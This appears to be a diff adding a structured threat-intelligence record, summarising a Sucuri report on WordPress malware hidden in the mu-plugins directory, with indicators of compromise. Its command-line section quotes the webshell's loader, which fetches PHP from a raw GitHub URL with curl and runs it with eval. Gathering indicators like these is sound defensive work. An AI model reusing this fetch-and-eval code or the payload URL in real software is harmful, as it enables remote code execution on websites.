@@ -1,0 +1,49 @@
+summary: "Sucuri researchers have identified multiple WordPress infections leveraging the mu-plugins directory to hide malicious code. These include a fake update redirect, a webshell for remote code execution, and a spam injector."
+date: "N/A" # Date not explicitly provided in the report
+authors: [] # Authors not listed in the report
+attribution: "Threat actors" # No specific attribution (APT group or country) is mentioned.
+malware_families:
+  - "Fake Update Redirection Malware"
+  - "Webshell"
+  - "Spam Injector"
+
+TTPs:
+  processs:
+    - "curl"
+  commandline:
+    - "curl_init(https://raw.githubusercontent.com/starkvps99812/upd/refs/heads/main/BypassBest.php)"
+    - "curl_setopt($connectionHandle, CURLOPT_RETURNTRANSFER, true)"
+    - "curl_exec($connectionHandle)"
+    - "curl_close($connectionHandle)"
+    - "eval(\"?>" . $retrievedCode)"
+  powershell: [] # No PowerShell scripts identified.
+  scripting_engine:
+    - "JavaScript"
+  registry_keys: [] # No registry keys impacted are mentioned.
+  network_connections:
+    - process: "curl"
+      port: "" # Port not specified
+      destination:
+        - "https://raw.githubusercontent.com/starkvps99812/upd/refs/heads/main/BypassBest.php"
+        - "updatesnow[.]net"
+        - "https://imagex1[.]sx[.]cdn[.]live/images/pinporn/2022/02/23/26777510.gif?width=620"
+        - "https://imagex1[.]sx[.]cdn[.]live/images/pinporn/2023/01/26/28785006.gif?width=620"
+  file_modifications:
+    - path: "wp-content/mu-plugins/redirect.php"
+    - path: "./wp-content/mu-plugins/index.php"
+    - path: "wp-content/mu-plugins/custom-js-loader.php"
+  persistence:
+    description: "Malware loads automatically with WordPress due to placement in the mu-plugins directory."
+  pipes: [] # No named pipes identified.
+  process_relations: [] # Process relations not described
+
+IOCs:
+  hashes: [] # No hashes provided
+  ips: [] # No IPs provided
+  domains:
+    - "updatesnow[.]net"
+    - "imagex1[.]sx[.]cdn[.]live"
+    - "raw.githubusercontent.com"
+  urls:
+    - "https://raw.githubusercontent.com/starkvps99812/upd/refs/heads/main/BypassBest.php"
+reference: https://blog.sucuri.net/2025/03/hidden-malware-strikes-again-mu-plugins-under-attack.html
